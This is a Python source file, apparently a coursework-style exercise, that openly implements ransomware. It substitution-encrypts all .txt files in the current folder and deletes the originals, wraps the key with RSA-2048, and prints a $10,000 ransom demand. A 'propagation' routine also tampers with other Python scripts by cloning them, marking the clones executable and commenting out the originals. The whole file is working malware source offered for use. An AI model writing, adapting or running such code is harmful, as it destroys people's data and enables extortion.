#!/usr/bin/env python3
"""
## Requirements
- Make a python ransomware using pycryptodome package
- key-recovery and file-recovery to be seperated
    - key-recovery (By the hacker)
    - file-recovery (By the victim)

## Program Requirements
- Substitution Cipher

## Setup
### Pre-Requisites
+ python
+ pip
### Dependencies
+ pycryptodome
### Obtaining
### Installing

## Documentation
### Synopsis/Syntax
### Parameters
### Usage
"""

# Built-in Libraries
import os
import sys
import random

# Cryptodome
from Crypto.Random import get_random_bytes  # Random Generation
from Crypto.PublicKey import RSA            # Utility to retrieve Public Key
from Crypto.Cipher import PKCS1_OAEP        # Encryption Algorithm

# For Symmetric Key Encryption
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode

# Global Variables
alphabet_list = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

"""
Algorithms
"""
def substitution_cipher():
    """
    Substitution Cipher

    - Randomly shuffle to generate a cipher alphabet list and
    - Encrypt this with AES to be the Symmetric Key
    - Use this list for decryption
    """ 
    # print("Alphabet List : {}".format(alphabet_list))

    # Shuffle the list randomly
    cipher_list = list(alphabet_list)
    random.shuffle(cipher_list)

    # Get Passphrase by encrypting the cipher list using Public Key Encryption (PKE) via RSA-2048
    cipher_list_str = ''.join(cipher_list).encode("utf-8") # Convert randomized cipher list into string

    # print("Cipher List : {}".format(cipher_list))

    """
    Encrypt the key using RSA-2048 and 
    - Write the Symmetric Key into 'key.bin' for Recovery
    """
    # Encrypt the key using RSA-2048 
    rsa_key_pair = RSA.generate(2048) # Generate Public and Private Key Pair for RSA of size 2048-bits
    private_key = rsa_key_pair.export_key() # Get Private Key from Key Pair
    public_key = rsa_key_pair.publickey().export_key() # Get Public Key from Key Pair

    # Write Private Key into a key file
    # with open("key-recovery-private.bin", "wb") as recovery_private_key_Write:
    with open("ransomprvkey.pem", "wb") as recovery_private_key_Write:
        recovery_private_key_Write.write(private_key)
        recovery_private_key_Write.close()

    # Write Public Key into a key file
    # with open("key-recovery-public.bin", "wb") as recovery_public_key_Write:
    with open("ransompublickey.pem", "wb") as recovery_public_key_Write:
        recovery_public_key_Write.write(public_key)
        recovery_public_key_Write.close()

    # Encrypt Symmetric Key with RSA using Public Key (Victim)
    # recipient_key = RSA.import_key(open("key-recovery-public.bin").read()) # Import in the receiver's Public Key File (owned by victim)
    recipient_key = RSA.import_key(open("ransompublickey.pem").read()) # Import in the victim's Public Key File

    # Write the key into 'key.bin'
    if os.path.isfile("key.txt"):
        # If key.txt exists
        os.remove("key.txt")

    with open("key.bin", "wb") as key_write:
        # Encrypt
        cipher_rsa = PKCS1_OAEP.new(recipient_key) # Generate new RSA PKCS1_OAEP cipher object
        enc_data = cipher_rsa.encrypt(cipher_list_str) # Encrypt key using the cipher object into a cipher text
        # Write Encrypted Key into file
        key_write.write(enc_data)
        key_write.close() 

    return cipher_list
   
def enc(key, files): 
    """
    Encrypt using Key generated from the Substitution Cipher

    :: Params
        key
            Description : The Cipher List
            Type: List

        files
            Description : List of files
            Type: List
    """
    enc_files = {} # List of encrypted files and their extension
    # print("Key : {}".format(key))

    for file in files:
        # print("File : {}".format(file))
        file_name = os.path.splitext(file)[0]
        file_ext = os.path.splitext(file)[1]
        if file_ext == ".txt":
            enc_files[file_name] = file_ext # Map File name to File Extension
            content = ""
            ciphertext = ""
            with open(file, "r") as read_plaintext:
                # Read file contents
                content = read_plaintext.read()
                read_plaintext.close()

            # Encrypt File contents with substitution cipher
            for char in content:
                # print("Current Letter : {}".format(char))
                # Scramble and substitute letters according to 
                # Cipherlist
                if char.upper() in alphabet_list:
                    # Check if character is in the alphabet_list
                    symbol_index = alphabet_list.find(char.upper()) # Find the current character in the alphabet list
                    if char.isupper():
                        # Is lower : Set to lower case
                        # print("Key Character in Index {} : {}".format(symbol_index, key[symbol_index].upper()))
                        ciphertext += key[symbol_index].upper()
                    else:
                        # Is Upper : Set to upper case
                        # print("Key Character in Index {} : {}".format(symbol_index, key[symbol_index].lower()))
                        ciphertext += key[symbol_index].lower()
                else:
                    # Just add that character/symbol
                    ciphertext += char

                # Check Ciphertext
                # print("Contents : {}".format(ciphertext))

            # Write encrypted contents into encrypted file as binary
            with open(file_name + ".enc", "wb") as enc_file:
                # Encrypt file
                enc_file.write(ciphertext.encode("utf-8"))
                enc_file.close()
        
            # Delete original file
            os.remove(file)
    
    # Write Encrypted Files List to text file
    with open("encrypted.lst", "w") as write_enc_files:
        for file_name, file_ext in enc_files.items():
            write_enc_files.writelines("{}={}".format(file_name, file_ext))
        write_enc_files.close()



        
def trigger():
    """
    Condition to activate payload
    """


def payload():
    """
    Payload to execute
    """
    path = "./"
    files = os.listdir(path)

    # Get randomized cipher list
    cipher_list = substitution_cipher()

    """ Extra Steps - Removed for Documentation
    Generate Public and Private Key Pair and 
    Write Public Key to Key File
    
    # Generate Public and Private Keys pair
    key = RSA.generate(2048) # Generate Public and Private Key Pair for RSA of size 2048-bits
    private_key = key.export_key() # Get Private Key from Key Pair

    # Write Private Key (kept by attacker) to Key File
    with open("ransomprvkey.pem", "wb") as write_privateKey:
        write_privateKey.write(private_key)
        write_privateKey.close()

    public_key = key.publickey().export_key() # Get Public Key from Key Pair

    # Write Public Key (kept by victim) to Key File
    with open("ransompublickey.pem", "wb") as write_publicKey:
        write_publicKey.write(public_key)
        write_publicKey.close()
    """

    # Encrypt the files with substitution cipher
    enc(''.join(cipher_list), files)

def propagation():
    """
    Propagation/Spreading mechanism
    """
    mode_EXE = 0o777

    exclude_list = [
        "ransomware.py",
        "key-recovery.py",
        "file-recovery.py"
    ]

    files = os.listdir()
    for file in files:
        # print("File : {}".format(file))
        file_name = os.path.splitext(file)[0]
        file_ext = os.path.splitext(file)[1]

        if file_ext == ".py":
            # Check if current file is in the exclude list
            if file not in exclude_list:
                # Copy the first python script's contents to a clone script
                copy_File = "{}-clone{}".format(file_name, file_ext)
                with open(file, "r") as read_ransomware_Copy:
                    contents = read_ransomware_Copy.read()
                    with open(copy_File, "w") as write_ransomware_Copy:
                        write_ransomware_Copy.write(contents)
                        write_ransomware_Copy.close()
                    read_ransomware_Copy.close()

                # Make second python file executable
                os.chmod(copy_File, mode_EXE)

                # Comments out all code in the first file and write to list
                file_contents = []
                with open(file, "r") as ransomware_Mod:
                    line = ransomware_Mod.readline()
                    while line:
                        file_contents.append("# {}".format(line))
                        line = ransomware_Mod.readline()
                    # print("".join(file_contents))
                    ransomware_Mod.close()

                # Write commented out list into current file to comment the script
                with open(file, "w") as write_comment:
                    write_comment.write("".join(file_contents))
                    write_comment.close()


    
def after_lock():
    """
    After locking
    """
    print("Your text files are encrypted. To decrypt them, you need to pay me $10,000 and send {} in your folder to {}.".format("key.bin", "your-name"))

def main():
    """
    Main Runner
    """
    payload()
    after_lock()
    propagation()

if __name__ == "__main__":
    main()
